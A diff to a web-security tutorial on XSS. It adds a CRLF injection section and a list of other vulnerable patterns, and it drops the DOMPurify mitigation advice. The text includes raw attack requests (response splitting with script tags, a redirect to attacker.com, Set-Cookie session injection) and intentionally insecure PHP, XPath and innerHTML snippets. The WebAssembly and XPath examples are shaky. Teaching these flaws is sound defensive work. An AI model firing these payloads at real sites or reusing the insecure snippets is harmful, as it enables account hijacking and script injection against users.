@@ -457,15 +457,124 @@ Here’s an example of a secure CSP header that mitigates most XSS attacks:
 ```
 Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-random-nonce'; style-src 'self' 'nonce-random-nonce'; object-src 'none'; frame-ancestors 'none'; base-uri 'self'; form-action 'self';
 ```
+# CRLF Injection to XSS
 
-Use Security Libraries
-Utilize libraries like DOMPurify to clean HTML inputs and prevent XSS.
+CRLF injection (Carriage Return Line Feed) is a vulnerability that occurs when an attacker can inject CRLF characters into an application, typically resulting in the manipulation of HTTP headers or log files. This guide explores how CRLF injection can be exploited to perform XSS attacks.
 
- Example DOMPurify Usage
+1. Understanding CRLF Injection
+CRLF injection vulnerabilities occur when an application improperly handles user input, allowing the injection of CR (Carriage Return, \r, %0d) and LF (Line Feed, \n, %0a) characters. This can lead to:
 
-var clean = DOMPurify.sanitize(dirty);
-8. References
-Pentest-Tools Blog on XSS Attacks
-Hacktricks XSS Documentation
-Hacktricks on CSP Bypass
-This guide provides a comprehensive overview of XSS, various attack scenarios, contexts of injection, advanced techniques, and best practices for mitigation. Understanding these concepts is crucial for both defending against and exploiting XSS vulnerabilities in web applications.
+Manipulation of HTTP headers
+Injection into logs
+HTTP response splitting
+
+Basic CRLF Injection
+CRLF injection can be used to inject new headers or modify the existing ones by breaking the intended structure of the HTTP response.
+
+GET /vulnerable.php?param=value%0d%0aInjected-Header: injected_value HTTP/1.1
+
+In this example, Injected-Header: injected_value would be treated as a new header.
+
+CRLF Injection to XSS
+By leveraging CRLF injection, an attacker can inject malicious content, including scripts, into the HTTP response, potentially leading to XSS.
+
+3.1 Injecting Scripts via HTTP Response Splitting
+HTTP response splitting occurs when CRLF injection allows the creation of additional HTTP responses. This can be exploited to insert scripts directly into the response body.
+
+Example
+Assume a vulnerable application includes user input directly in HTTP headers. An attacker can inject CRLF characters followed by a script tag.
+GET /vulnerable.php?param=value%0d%0aContent-Length:%2023%0d%0a%0d%0a<script>alert(1)</script> HTTP/1.1
+
+
+URL Redirection and CRLF Injection
+Another approach is to use CRLF injection to manipulate redirection headers and include XSS payloads.
+
+Consider an application that redirects users based on input parameters. An attacker can inject CRLF characters to terminate the location header and include a script.
+GET /redirect.php?url=http://example.com%0d%0aLocation:%20http://attacker.com/xss.html HTTP/1.1
+
+Log Injection
+CRLF injection can also be used to manipulate server logs, potentially leading to XSS when logs are viewed in an insecure application.
+
+An attacker injects a script into log entries:
+GET /vulnerable.php?param=value%0d%0a%0d%0a<script>alert(1)</script> HTTP/1.1
+
+Advanced CRLF Injection Techniques
+4.1 Double CRLF Injection
+Using multiple CRLF sequences to break the HTTP response in more complex scenarios.
+
+GET /vulnerable.php?param=value%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<script>alert(1)</script> HTTP/1.1
+
+Hybrid Injection
+Combining CRLF injection with other techniques such as parameter pollution or path traversal to enhance the attack.
+
+GET /vulnerable.php?param1=value1&param2=value2%0d%0aSet-Cookie:%20session=malicious_value%0d%0a%0d%0a<script>alert(1)</script> HTTP/1.1
+
+CRLF injection is a powerful technique that can lead to severe security vulnerabilities, including XSS. Understanding how to exploit and mitigate CRLF injection is crucial for securing web applications. By employing proper input validation, header handling, and security policies, developers can protect their applications from these attacks.
+
+# Other Vulnerabilities leading to XSS
+PDF Generation Vulnerabilities
+ Dynamic PDF Content Injection
+When generating PDFs dynamically from user input, malicious content can lead to XSS.
+```
+// Vulnerable PDF generation code
+$pdf->writeHTML($_POST['user_input']);
+```
+
+XML Injection
+XML data that includes user input can be manipulated to include malicious scripts.
+```
+<!-- Vulnerable XML data -->
+<user>
+  <name><?php echo $_POST['name']; ?></name>
+</user>
+```
+
+XPath Injection Leading to XSS
+XPath injection vulnerabilities can be exploited to retrieve sensitive data and potentially inject XSS.
+
+```
+// Vulnerable XPath query
+$query = "//user[name/text()='" . $_POST['name'] . "']";
+$result = $xpath->query($query);
+```
+
+Unsafe Use of innerHTML
+Using innerHTML to insert user input into the DOM can lead to XSS.
+```
+document.getElementById('output').innerHTML = user_input;
+```
+
+Exploiting URL Fragments
+User-controlled fragments in URLs can be manipulated to inject scripts.
+```
+// Vulnerable code using location.hash
+var fragment = location.hash.substring(1);
+document.getElementById('output').innerHTML = fragment;
+
+// If an attacker controls the URL
+http://example.com#<img src=x onerror=alert(1)>
+```
+
+Misconfigured Content-Type Headers
+Misconfigured Content-Type headers can cause browsers to interpret data as executable scripts.
+```
+// Response with wrong Content-Type
+Content-Type: text/html
+
+{"user": "<script>alert(1)</script>"}
+```
+
+Injecting Malicious Frames
+Injecting malicious content into iframe sources can lead to XSS.
+```
+<iframe src="<?php echo $_GET['page']; ?>"></iframe>
+
+// if an attacker submits
+http://example.com/page.php?page=http://malicious.com
+```
+
+Exploiting WebAssembly
+WebAssembly (Wasm) code that includes user input can be manipulated to execute malicious scripts.
+```
+WebAssembly.instantiateStreaming(fetch('module.wasm'), { env: { userInput: user_input } });
+```
